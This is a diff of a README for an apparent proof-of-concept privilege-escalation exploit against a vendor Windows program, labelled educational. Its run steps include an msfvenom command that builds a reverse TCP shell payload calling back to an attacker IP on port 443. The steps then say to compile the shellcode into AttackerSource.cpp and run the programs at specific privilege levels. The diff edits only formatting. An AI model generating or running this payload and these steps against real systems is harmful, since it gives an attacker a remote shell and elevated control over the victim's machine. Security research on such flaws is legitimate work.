@@ -4,13 +4,12 @@ You can read more about this code: https://glory-part-39d.notion.site/Security-o
 These codes allow you to create a security hole in your program. You can also use this vulnerability and cause privilege escalation.
 **Note that this is a POC and is for educational purposes only**
 ## Run this code
-Generate shellcode for AttackerPE.exe
+Generate shellcode for AttackerPE.exe\n
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.148 LPORT=443 -f c -b \x00\x0a\x0d
 copy shellcode to AttackerSource.cpp and compile it.
-``
+
 run powershell.exe with Admin privilege
 run notepad.exe with normal-user
-``
 run vendor.exe with Admin privilege
 ```
 Vendor.exe
